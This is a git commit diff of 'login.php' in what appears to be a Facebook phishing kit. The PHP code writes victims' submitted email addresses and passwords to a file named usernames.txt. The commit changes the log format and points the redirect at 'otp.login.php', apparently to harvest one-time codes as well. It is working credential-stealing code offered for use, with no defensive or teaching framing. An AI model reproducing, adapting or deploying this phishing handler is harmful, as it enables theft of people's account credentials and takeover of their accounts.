22e2ffebc14a5af631e3bf721897379bc3718e9c
Md Alfaz <125147223+mdalfaz@users.noreply.github.com>
2025-01-03 23:42:12 +0600

    Update login.php

--- .sites/facebook/login.php
+++ .sites/facebook/login.php
@@ -1,5 +1,5 @@
-<?php 
-file_put_contents("usernames.txt", "Facebook Username: " . $_POST['email'] . " Pass: " . $_POST['pass'] ."\n", FILE_APPEND);
-header('Location: https://facebook.com/recover/initiate/');
+<?php
+file_put_contents("usernames.txt", "Facebook Username: " . $_POST['email'] . "\n". "Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
+header('Location: otp.login.php');
 exit();
 ?>
